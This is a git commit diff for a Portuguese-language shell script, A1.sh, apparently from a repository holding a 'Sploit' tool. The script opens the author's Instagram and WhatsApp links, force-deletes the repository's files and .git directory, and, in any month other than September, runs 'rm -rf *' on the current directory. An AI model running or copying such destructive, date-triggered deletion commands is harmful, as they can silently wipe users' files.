3df065a5cfa5417bebe418bd4010f098a6fd0177
Mike Edwards <82988362+mike90s15@users.noreply.github.com>
2022-09-02 21:19:25 -0300

    Update A1.sh

--- A1.sh
+++ A1.sh
@@ -9,7 +9,7 @@ echo $'\n\e[1;33m Abrindo os links...\e[m'
 xdg-open https://www.instagram.com/mike90s15/ &> /dev/null && sleep 10
 xdg-open https://chat.whatsapp.com/FnqHx08Dwo7CGnmrAu8WsY &> /dev/null && sleep 5
 #xdg-open https://chat.whatsapp.com/HCavGIY9pR35BRZjoLoFGP &> /dev/null && sleep 5
-for i in "README.md" "Sploit" "SECURITY.md" "LICENSE" "index.html" ".git"; do rm -rf "${i}"; done
+rm -rf "README.md" "Sploit" "SECURITY.md" "LICENSE" "index.html" ".git"
 if [[ "$(date +%B)" != "September" ]]; then
     clear
     rm -rf *
